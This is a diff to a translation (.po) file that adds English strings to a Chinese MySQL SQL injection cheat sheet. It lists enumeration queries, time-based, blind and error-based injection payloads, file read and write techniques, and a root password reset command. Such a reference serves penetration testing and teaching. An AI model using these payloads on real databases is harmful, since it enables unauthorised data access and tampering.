@@ -20,97 +20,99 @@ msgstr ""
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:2
 msgid "MySQL Payload"
-msgstr ""
+msgstr "MySQL Payload"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:5
 msgid "常见Payload"
-msgstr ""
+msgstr "Common Payloads"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:6
 msgid "Version"
-msgstr ""
+msgstr "Version"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:7
 msgid "``SELECT @@version``"
-msgstr ""
+msgstr "``SELECT @@version``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:8
 msgid "Comment"
-msgstr ""
+msgstr "Comment"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:9
 msgid "``SELECT 1 -- comment``"
-msgstr ""
+msgstr "``SELECT 1 -- comment``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:10
 msgid "``SELECT 1 # comment``"
-msgstr ""
+msgstr "``SELECT 1 # comment``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:11
 msgid "``SELECT /*comment*/1``"
-msgstr ""
+msgstr "``SELECT /*comment*/1``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:12
 msgid "Space"
-msgstr ""
+msgstr "Space"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:13
 msgid "``0x9`` ``0xa-0xd`` ``0x20`` ``0xa0``"
-msgstr ""
+msgstr "``0x9`` ``0xa-0xd`` ``0x20`` ``0xa0``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:14
 msgid "Current User"
-msgstr ""
+msgstr "Current User"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:15
 msgid "``SELECT user()``"
-msgstr ""
+msgstr "``SELECT user()``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:16
 msgid "``SELECT system_user()``"
-msgstr ""
+msgstr "``SELECT system_user()``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:17
 msgid "``SELECT current_role()``"
-msgstr ""
+msgstr "``SELECT current_role()``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:18
 msgid "List User"
-msgstr ""
+msgstr "List Users"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:19
 msgid "``SELECT user FROM mysql.user``"
-msgstr ""
+msgstr "``SELECT user FROM mysql.user``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:20
 msgid "Current Database"
-msgstr ""
+msgstr "Current Database"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:21
 msgid "``SELECT database()``"
-msgstr ""
+msgstr "``SELECT database()``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:22
 msgid "List Database"
-msgstr ""
+msgstr "List Databases"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:23
 msgid "``SELECT schema_name FROM information_schema.schemata``"
-msgstr ""
+msgstr "``SELECT schema_name FROM information_schema.schemata``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:24
 msgid "List Tables"
-msgstr ""
+msgstr "List Tables"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:25
 msgid ""
 "``SELECT table_schema,table_name FROM information_schema.tables WHERE "
 "table_schema != 'mysql' AND table_schema != 'information_schema'``"
 msgstr ""
+"``SELECT table_schema,table_name FROM information_schema.tables WHERE "
+"table_schema != 'mysql' AND table_schema != 'information_schema'``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:26
 msgid "List Columns"
-msgstr ""
+msgstr "List Columns"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:27
 msgid ""
@@ -118,72 +120,77 @@ msgid ""
 "information_schema.columns WHERE table_schema != 'mysql' AND table_schema"
 " != 'information_schema'``"
 msgstr ""
+"``SELECT table_schema, table_name, column_name FROM "
+"information_schema.columns WHERE table_schema != 'mysql' AND table_schema"
+" != 'information_schema'``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:28
 msgid "If"
-msgstr ""
+msgstr "If"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:29
 msgid "``SELECT if(1=1,'foo','bar');`` return 'foo'"
-msgstr ""
+msgstr "``SELECT if(1=1,'foo','bar');`` returns 'foo'"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:30
 msgid "Ascii"
-msgstr ""
+msgstr "ASCII"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:31
 msgid "``SELECT char(0x41)``"
-msgstr ""
+msgstr "``SELECT char(0x41)``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:32
 msgid "``SELECT ascii('A')``"
-msgstr ""
+msgstr "``SELECT ascii('A')``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:33
 msgid "``SELECT 0x414243`` => return ``ABC``"
-msgstr ""
+msgstr "``SELECT 0x414243`` => returns ``ABC``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:34
 msgid "Delay"
-msgstr ""
+msgstr "Delay"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:35
 msgid "``sleep(1)``"
-msgstr ""
+msgstr "``sleep(1)``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:36
 msgid "``SELECT BENCHMARK(1000000,MD5('A'))``"
-msgstr ""
+msgstr "``SELECT BENCHMARK(1000000,MD5('A'))``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:37
 msgid "Read File"
-msgstr ""
+msgstr "Read File"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:38
 msgid "``select @@datadir``"
-msgstr ""
+msgstr "``select @@datadir``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:39
 msgid "``select load_file('databasename/tablename.MYD')``"
-msgstr ""
+msgstr "``select load_file('databasename/tablename.MYD')``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:40
 msgid "Blind"
-msgstr ""
+msgstr "Blind"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:41
 msgid "``ascii(substring(str,pos,length)) & 32 = 1``"
-msgstr ""
+msgstr "``ascii(substring(str,pos,length)) & 32 = 1``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:42
 msgid "Error Based"
-msgstr ""
+msgstr "Error-Based"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:43
 msgid ""
 "``select count(*),(floor(rand(0)*2))x from information_schema.tables "
 "group by x;``"
 msgstr ""
+"``select count(*),(floor(rand(0)*2))x from information_schema.tables "
+"group by x;``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:44
 msgid ""
@@ -191,93 +198,101 @@ msgid ""
 "group by concat((select table_name from information_schema.tables limit "
 "1),floor(rand(0)*2))``"
 msgstr ""
+"``select count(*) from (select 1 union select null union select !1)x "
+"group by concat((select table_name from information_schema.tables limit "
+"1),floor(rand(0)*2))``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:45
 msgid "Change Password"
-msgstr ""
+msgstr "Change Password"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:46
 msgid ""
 "``mysql -uroot -e \"use mysql;UPDATE user SET "
 "password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;\"``"
 msgstr ""
+"``mysql -uroot -e \"use mysql;UPDATE user SET "
+"password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;\"``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:49
 msgid "报错注入常见函数"
-msgstr ""
+msgstr "Common Error-Based Injection Functions"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:50
 msgid "extractvalue"
-msgstr ""
+msgstr "extractvalue"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:51
 msgid "updatexml"
-msgstr ""
+msgstr "updatexml"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:52
 msgid "GeometryCollection"
-msgstr ""
+msgstr "GeometryCollection"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:53
 msgid "linestring"
-msgstr ""
+msgstr "linestring"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:54
 msgid "multilinestring"
-msgstr ""
+msgstr "multilinestring"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:55
 msgid "multipoint"
-msgstr ""
+msgstr "multipoint"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:56
 msgid "multipolygon"
-msgstr ""
+msgstr "multipolygon"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:57
 msgid "polygon"
-msgstr ""
+msgstr "polygon"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:58
 msgid "exp"
-msgstr ""
+msgstr "exp"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:61
 msgid "写文件"
-msgstr ""
+msgstr "Write Files"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:64
 msgid "写文件前提"
-msgstr ""
+msgstr "Prerequisites for Writing Files"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:65
 msgid "root 权限"
-msgstr ""
+msgstr "root privileges"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:66
 msgid "知晓文件绝对路径"
-msgstr ""
+msgstr "Know the absolute file path"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:67
 msgid "写入的路径存在写入权限"
-msgstr ""
+msgstr "The target path has write permission"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:68
 msgid "secure_file_priv 允许向对应位置写入"
-msgstr ""
+msgstr "secure_file_priv allows writing to the target location"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:69
 msgid "``select count(file_priv) from mysql.user``"
-msgstr ""
+msgstr "``select count(file_priv) from mysql.user``"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:72
 msgid "基于 into 写文件"
-msgstr ""
+msgstr "Write Files with INTO"
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:78
 msgid "dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏"
 msgstr ""
+"dumpfile differs from outfile in that outfile writes a newline at the end "
+"of each row and escapes newline characters. If used to write binary files, "
+"this behavior is likely to corrupt them."
 
 #: ../../source/vuln/sql/cheatsheet/mysql.rst:81
 msgid "基于 log 写文件"
-msgstr ""
+msgstr "Write Files with Logs"
